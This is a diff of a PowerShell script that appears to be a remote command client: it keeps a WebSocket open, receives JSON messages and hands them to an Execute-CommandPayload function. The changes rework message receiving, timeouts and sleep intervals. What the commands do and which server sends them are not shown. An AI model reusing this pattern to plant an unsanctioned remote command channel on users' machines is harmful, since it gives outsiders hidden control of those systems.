@@ -27,7 +27,7 @@ else {
 }
 
 $uniqueUser = "$($env:USERNAME)-$uniqueId-W"
-$SCRIPT_VERSION = "7cba5b3"
+$SCRIPT_VERSION = "516e9c9"
 $clientVersion = $SCRIPT_VERSION
 
 function Execute-CommandPayload ($r) {
@@ -92,21 +92,30 @@ try {
             $lastPing = [DateTime]::UtcNow
           }
 
+          $receiveTask = $ws.ReceiveAsync($buffer, [System.Threading.CancellationToken]::None)
+          if (-not $receiveTask.Wait(2000)) {
+            continue
+          }
+
+          $result = $receiveTask.Result
+          if ($result.MessageType -eq [System.Net.WebSockets.WebSocketMessageType]::Close) {
+            $ws.CloseAsync([System.Net.WebSockets.WebSocketCloseStatus]::NormalClosure, "", [System.Threading.CancellationToken]::None).Wait()
+            break
+          }
+
           $ms = New-Object System.IO.MemoryStream
-          do {
+          if ($result.Count -gt 0) {
+            $ms.Write($buffer.Array, $buffer.Offset, $result.Count)
+          }
+
+          while (-not $result.EndOfMessage -and $ws.State -eq [System.Net.WebSockets.WebSocketState]::Open) {
             $receiveTask = $ws.ReceiveAsync($buffer, [System.Threading.CancellationToken]::None)
-            if (-not $receiveTask.Wait(3000)) {
-              break
-            }
+            $receiveTask.Wait()
             $result = $receiveTask.Result
-            if ($result.MessageType -eq [System.Net.WebSockets.WebSocketMessageType]::Close) {
-              $ws.CloseAsync([System.Net.WebSockets.WebSocketCloseStatus]::NormalClosure, "", [System.Threading.CancellationToken]::None).Wait()
-              break
-            }
             if ($result.Count -gt 0) {
               $ms.Write($buffer.Array, $buffer.Offset, $result.Count)
             }
-          } while (-not $result.EndOfMessage)
+          }
 
           if ($ms.Length -gt 0) {
             $jsonStr = [System.Text.Encoding]::UTF8.GetString($ms.ToArray())
@@ -114,6 +123,7 @@ try {
             Execute-CommandPayload $r
           }
         }
+
       }
     }
     catch {
@@ -123,9 +133,10 @@ try {
         Execute-CommandPayload $r
       }
       catch {}
+      Start-Sleep -Seconds 3
     }
-    Start-Sleep -Seconds 2
   }
+
 
 }
 finally {
